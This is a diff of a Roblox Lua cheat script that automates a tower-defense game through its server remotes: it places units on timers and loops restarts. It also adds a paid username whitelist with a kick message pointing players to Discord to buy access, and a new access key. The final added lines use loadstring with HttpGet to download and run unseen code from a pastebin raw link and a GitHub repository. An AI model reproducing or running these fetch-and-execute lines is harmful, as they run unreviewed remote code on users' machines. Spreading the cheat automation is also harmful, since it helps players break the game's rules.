@@ -1,8 +1,130 @@
---// Key system
+--// Whitelist system
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 
-print("Waiting for key...")
+local whitelist = {
+    ["Dark_209813"] = true,
+    ["balbonbacono"] = true,
+    ["balbonbacon"] = true,
+    ["vellryesBBC"] = true,
+    ["sau2010052"] = true,
+    ["lukysestakcz"] = true,
+    ["ToxicM1817"] = true,
+    ["namfhhh2"] = true,
+    ["LanamrNTHr"] = false,
+    ["Anonimato_91"] = true,
+    ["juztphunz"] = true,
+    ["dieoutzzzz"] = true,
+    ["nxxteiei"] = true,
+    ["mimipokop"] = true,
+    ["jadpai24"] = true,
+    ["Hdhjsnsjzvzj"] = true,
+    ["Hyasp4"] = true,
+    ["fwrjhiee"] = true,
+    ["1919three"] = true,
+    ["Otaldovictormidia"] = true,
+    ["Am_kareem36839alt"] = true,
+    ["demonicjajajxd"] = true,
+    ["fuzifauzi"] = true,
+    ["Alqoure45"] = false,
+    ["molo_tw1"] = true,
+    ["DinoGok555"] = true,
+    ["Suukunaa888"] = true,
+    ["yuuji8888"] = true,
+    ["Wave110izz"] = true,
+    ["xma300z"] = true,
+    ["gpxdronex"] = true,
+    ["pcx160ccx"] = true,
+    ["4bangzz"] = true,
+    ["1mill888z"] = true,
+    ["dusfuxxx"] = true,
+    ["dusfuxx"] = true,
+    ["SamMaBig30"] = true,
+    ["dusfaaq"] = true,
+    ["sopainnn"] = true,
+    ["YaysRagna"] = true,
+    ["Tien_Fram"] = true,
+    ["tindeptraigem7"] = true,
+    ["tindeptraigem8"] = true,
+    ["tindeptraigem9"] = true,
+    ["tindeptraigem11"] = true,
+    ["tindeptraigem12"] = true,
+    ["tindeptraigem13"] = true,
+    ["7CaNyV83zcy13N"] = true,
+    ["Dreamer_playz9"] = true,
+    ["OMAR_SALAK1510"] = true,
+    ["growagardenvinh"] = true,
+    ["padil_10s"] = true,
+    ["Lonewolfgameing"] = true,
+    ["bebekoyen1"] = true,
+    ["adoptmekonfetu1"] = true,
+    ["adoptmekonfetu2"] = true,
+    ["adoptmekonfetu4"] = true,
+    ["VtZxNoWsuJU"] = true,
+    ["roo00_00"] = true,
+    ["natuskol1"] = true,
+    ["0Rusian069"] = true,
+    ["1RUSIAN069"] = true,
+    ["ITSMEHARSH132"] = true,
+    ["Vasika2282"] = true,
+    ["Dark_20981"] = true,
+    ["somerandomguy13424"] = true,
+    ["king_izen1"] = true,
+    ["Llamacanspit1"] = true,
+    ["progemes464235"] = true,
+    ["justcr15"] = true,
+    ["tisendubai"] = true,
+    ["stickdef18"] = true,
+    ["stickdef17"] = true,
+    ["stickdef12"] = true,
+    ["stickdef11"] = true,
+    ["loveking292"] = true,
+    ["stickdef19"] = true,
+    ["stickdef20"] = true,
+    ["Plsloger1"] = true,
+    ["Plsloger2"] = true,
+    ["rip_noob127324"] = true,
+    ["seqayyy"] = true,
+    ["karasenokmaks"] = true,
+    ["Arman174428"] = true,
+    ["Gill_k786"] = true,
+    ["tuanhuync12"] = true,
+    ["tokuda35196"] = true,
+    ["yamatehaha655"] = true,
+    ["playerVn408"] = true,
+    ["Margaret7x"] = true,
+    ["ChanHung1111"] = true,
+    ["PurpPom"] = true,
+    ["mamabinbolo1"] = true,
+    ["2Rusian069"] = true,
+    ["TinMotter76MA"] = true,
+    ["skiplegday365"] = true,
+    ["gbqp7o"] = true,
+    ["KenNguV"] = true,
+    ["nxuflux112"] = true,
+    ["chijioke06"] = true,
+    ["iyad3049"] = true,
+    ["hcnsigman"] = true,
+    ["stickdef21"] = true,
+    ["stickdef21"] = true,
+    ["aaronxac"] = true,
+    ["ryle_gwapo123456"] = true,
+    ["cot8q"] = true,
+    ["rip_tisod"] = true,
+    ["dibutcoutua2"] = true,
+    ["dolboeb_22234"] = true,
+    ["Akakakakubot"] = true,
+    ["Ektoras06gr"] = true,
+    ["3Rusian069"] = true,
+    ["4Rusian069"] = true
+}
+
+if not whitelist[plr.Name] then
+    plr:Kick("You are not whitelisted to use this script pls contact owner at discord to buy script and get whitelist.")
+    return
+end
+
+print(plr.Name .. " is whitelisted. Waiting for key...")
 
 --// Key GUI
 local ScreenGui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
@@ -58,212 +180,119 @@ task.delay(2, function()
     end)
 end)
 
---=== IMPROVED PLACEMENT SYSTEM ===--
-local function getValidPlacementData(position, rotation, isPathUnit)
-    if isPathUnit then
-        -- For Rafflesia (path-based unit) - simplified approach
-        return {
-            Valid = true,
-            PathIndex = 1, -- Try different path indices if this doesn't work
-            Position = position,
-            DistanceAlongPath = 0, -- Start of path
-            Rotation = rotation,
-            CF = CFrame.new(position) * CFrame.Angles(0, math.rad(rotation), 0)
-        }
-    else
-        -- For regular units like Slingshot and Golem Dragon
-        return {
-            Valid = true,
-            Position = position,
-            Rotation = rotation,
-            CF = CFrame.new(position) * CFrame.Angles(0, math.rad(rotation), 0)
-        }
-    end
-end
-
---=== SAFER UPGRADE SYSTEM (Using hotkey E) ===--
-local UIS = game:GetService("UserInputService")
-local function setupUpgradeHotkey()
-    local connection
-    connection = UIS.InputBegan:Connect(function(input, gameProcessed)
-        if gameProcessed then return end
-        
-        if input.KeyCode == Enum.KeyCode.E then
-            -- Try to upgrade selected unit or all slots
-            for slot = 1, 3 do
-                pcall(function()
-                    -- Method 1: Direct slot number
-                    remotes.UpgradeUnit:InvokeServer(slot)
-                    -- Method 2: String slot
-                    remotes.UpgradeUnit:InvokeServer(tostring(slot))
-                end)
-            end
-            warn("[Upgrade] Attempted upgrades on all slots")
-        end
-    end)
-    
-    return connection
-end
-
 --=== GAME SCRIPTS ===--
 
 function load2xScript()
     warn("[System] Loaded 2x Speed Script")
     remotes.ChangeTickSpeed:InvokeServer(2)
-    
-    local upgradeConnection = setupUpgradeHotkey()
 
-    local difficulty = "dif_hard"
-    
-    -- Improved placement positions (more reliable)
+    local difficulty = "dif_impossible"
     local placements = {
-        -- Slingshot (Early Game) - Slot 1
         {
-            time = 15, unit = "unit_slingshot", slot = 1,
-            isPathUnit = false,
-            position = Vector3.new(-845.806, 61.930, -165.568),
-            rotation = 180
+            time = 29, unit = "unit_lawnmower", slot = "1",
+            data = {Valid=true,PathIndex=3,Position=Vector3.new(-843.87384,62.1803055,-123.052032),
+                DistanceAlongPath=248.0065,
+                CF=CFrame.new(-843.87384,62.1803055,-123.052032,-0,0,1,0,1,-0,-1,0,-0),
+                Rotation=180}
         },
-        -- Rafflesia (Mid Game) - Slot 2 - SIMPLIFIED POSITION
         {
-            time = 47, unit = "unit_rafflesia", slot = 2,
-            isPathUnit = true,
-            position = Vector3.new(-842.381, 62.180, -159.840),
-            rotation = 180
+            time = 47, unit = "unit_rafflesia", slot = "2",
+            data = {Valid=true,PathIndex=3,Position=Vector3.new(-842.381287,62.1803055,-162.012131),
+                DistanceAlongPath=180.53,
+                CF=CFrame.new(-842.381287,62.1803055,-162.012131,1,0,0,0,1,0,0,0,1),
+                Rotation=180}
         },
-        -- Golem Dragon (Late Game) - Slot 3
         {
-            time = 85, unit = "unit_golem_dragon", slot = 3,
-            isPathUnit = false,
-            position = Vector3.new(-855.950, 61.930, -163.977),
-            rotation = 180
+            time = 85, unit = "unit_rafflesia", slot = "2",
+            data = {Valid=true,PathIndex=3,Position=Vector3.new(-842.381287,62.1803055,-164.507538),
+                DistanceAlongPath=178.04,
+                CF=CFrame.new(-842.381287,62.1803055,-164.507538,1,0,0,0,1,0,0,0,1),
+                Rotation=180}
+        },
+        {
+            time = 110, unit = "unit_rafflesia", slot = "2",
+            data = {Valid=true,PathIndex=2,Position=Vector3.new(-864.724426,62.1803055,-199.052032),
+                DistanceAlongPath=100.65,
+                CF=CFrame.new(-864.724426,62.1803055,-199.052032,-0,0,1,0,1,0,-1,0,0),
+                Rotation=180}
         }
     }
 
-    local function placeUnit(unitName, isPathUnit, position, rotation)
-        local placementData = getValidPlacementData(position, rotation, isPathUnit)
-        
-        -- Try multiple placement methods
-        local success = pcall(function()
-            remotes.PlaceUnit:InvokeServer(unitName, placementData)
-        end)
-        
-        if success then
-            warn("[Placing] SUCCESS: "..unitName.." at "..tostring(position))
-        else
-            warn("[Placing] FAILED: "..unitName.." - trying alternative...")
-            
-            -- Alternative placement method
-            pcall(function()
-                local altData = {
-                    Valid = true,
-                    Position = position,
-                    Rotation = rotation,
-                    CF = CFrame.new(position)
-                }
-                remotes.PlaceUnit:InvokeServer(unitName, altData)
-            end)
-        end
+    local function placeUnit(unitName, slot, data)
+        remotes.PlaceUnit:InvokeServer(unitName, data)
+        warn("[Placing] "..unitName.." at "..os.clock())
     end
 
     local function startGame()
         remotes.PlaceDifficultyVote:InvokeServer(difficulty)
-        
-        -- Place units with better error handling
         for _, p in ipairs(placements) do
             task.delay(p.time, function()
-                placeUnit(p.unit, p.isPathUnit, p.position, p.rotation)
+                placeUnit(p.unit, p.slot, p.data)
             end)
         end
-        
-        -- Manual upgrade instructions
-        warn("[Upgrade] Press E key to upgrade units manually")
-        warn("[Upgrade] Recommended: Press E around seconds 50, 60, 70, 80, 90, 100")
     end
 
-    -- Game loop for 4+ minute games
     while true do
         startGame()
-        task.wait(260) -- 4 minutes 20 seconds (260 seconds)
+        task.wait(174.5)
         remotes.RestartGame:InvokeServer()
-        task.wait(2) -- Brief pause before restart
     end
 end
 
 function load3xScript()
     warn("[System] Loaded 3x Speed Script")
     remotes.ChangeTickSpeed:InvokeServer(3)
-    
-    local upgradeConnection = setupUpgradeHotkey()
 
-    local difficulty = "dif_hard"
-    
-    -- Faster timings for 3x speed
+    local difficulty = "dif_impossible"
     local placements = {
-        -- Slingshot (Early Game)
         {
-            time = 12, unit = "unit_slingshot", slot = 1,
-            isPathUnit = false,
-            position = Vector3.new(-845.806, 61.930, -165.568),
-            rotation = 180
+            time = 23, unit = "unit_lawnmower", slot = "1",
+            data = {Valid=true,PathIndex=3,Position=Vector3.new(-843.87384,62.1803055,-123.052032),
+                DistanceAlongPath=248.0065,
+                CF=CFrame.new(-843.87384,62.1803055,-123.052032,-0,0,1,0,1,-0,-1,0,-0),
+                Rotation=180}
         },
-        -- Rafflesia (Mid Game)
         {
-            time = 32, unit = "unit_rafflesia", slot = 2,
-            isPathUnit = true,
-            position = Vector3.new(-842.381, 62.180, -159.840),
-            rotation = 180
+            time = 32, unit = "unit_rafflesia", slot = "2",
+            data = {Valid=true,PathIndex=3,Position=Vector3.new(-842.381287,62.1803055,-162.012131),
+                DistanceAlongPath=180.53,
+                CF=CFrame.new(-842.381287,62.1803055,-162.012131,1,0,0,0,1,0,0,0,1),
+                Rotation=180}
         },
-        -- Golem Dragon (Late Game)
         {
-            time = 57, unit = "unit_golem_dragon", slot = 3,
-            isPathUnit = false,
-            position = Vector3.new(-855.950, 61.930, -163.977),
-            rotation = 180
+            time = 57, unit = "unit_rafflesia", slot = "2",
+            data = {Valid=true,PathIndex=3,Position=Vector3.new(-842.381287,62.1803055,-164.507538),
+                DistanceAlongPath=178.04,
+                CF=CFrame.new(-842.381287,62.1803055,-164.507538,1,0,0,0,1,0,0,0,1),
+                Rotation=180}
+        },
+        {
+            time = 77, unit = "unit_rafflesia", slot = "2",
+            data = {Valid=true,PathIndex=2,Position=Vector3.new(-864.724426,62.1803055,-199.052032),
+                DistanceAlongPath=100.65,
+                CF=CFrame.new(-864.724426,62.1803055,-199.052032,-0,0,1,0,1,0,-1,0,0),
+                Rotation=180}
         }
     }
 
-    local function placeUnit(unitName, isPathUnit, position, rotation)
-        local placementData = getValidPlacementData(position, rotation, isPathUnit)
-        
-        local success = pcall(function()
-            remotes.PlaceUnit:InvokeServer(unitName, placementData)
-        end)
-        
-        if success then
-            warn("[Placing] SUCCESS: "..unitName.." at "..tostring(position))
-        else
-            warn("[Placing] FAILED: "..unitName.." - trying alternative...")
-            pcall(function()
-                local altData = {
-                    Valid = true,
-                    Position = position,
-                    Rotation = rotation,
-                    CF = CFrame.new(position)
-                }
-                remotes.PlaceUnit:InvokeServer(unitName, altData)
-            end)
-        end
+    local function placeUnit(unitName, slot, data)
+        remotes.PlaceUnit:InvokeServer(unitName, data)
+        warn("[Placing] "..unitName.." at "..os.clock())
     end
 
     local function startGame()
         remotes.PlaceDifficultyVote:InvokeServer(difficulty)
-        
         for _, p in ipairs(placements) do
             task.delay(p.time, function()
-                placeUnit(p.unit, p.isPathUnit, p.position, p.rotation)
+                placeUnit(p.unit, p.slot, p.data)
             end)
         end
-        
-        warn("[Upgrade] Press E key to upgrade units manually")
-        warn("[Upgrade] Recommended: Press E around seconds 40, 50, 60, 70, 80, 90")
     end
 
     while true do
         startGame()
-        task.wait(195) -- 3 minutes 15 seconds for 3x speed
+        task.wait(128)
         remotes.RestartGame:InvokeServer()
-        task.wait(2)
     end
 end
 
@@ -273,11 +302,12 @@ local function showSpeedMenu()
     TextBox.Visible = false
     CheckBtn.Visible = false
 
+    -- Reminder label directly below title
     local AutoSkipMsg = Instance.new("TextLabel", Frame)
     AutoSkipMsg.Size = UDim2.new(1, -20, 0, 30)
     AutoSkipMsg.Position = UDim2.new(0, 10, 0, 40)
     AutoSkipMsg.BackgroundTransparency = 1
-    AutoSkipMsg.Text = "Press E to upgrade units manually"
+    AutoSkipMsg.Text = "Pls Enable Auto Skip On Manually"
     AutoSkipMsg.Font = Enum.Font.GothamBold
     AutoSkipMsg.TextSize = 14
     AutoSkipMsg.TextColor3 = Color3.fromRGB(255, 200, 0)
@@ -308,7 +338,7 @@ end
 
 --=== KEY CHECK ===--
 CheckBtn.MouseButton1Click:Connect(function()
-    if TextBox.Text:lower() == "cracked" then
+    if TextBox.Text == "HELLROOT" then
         Label.Text = "Key Accepted!"
         Label.TextColor3 = Color3.fromRGB(0,255,0)
         task.delay(1, showSpeedMenu)
@@ -319,4 +349,5 @@ CheckBtn.MouseButton1Click:Connect(function()
     end
 end)
 
-print("Script loaded! Enter key: cracked")
+loadstring(game:HttpGet("https://pastebin.com/raw/HkAmPckQ"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))();
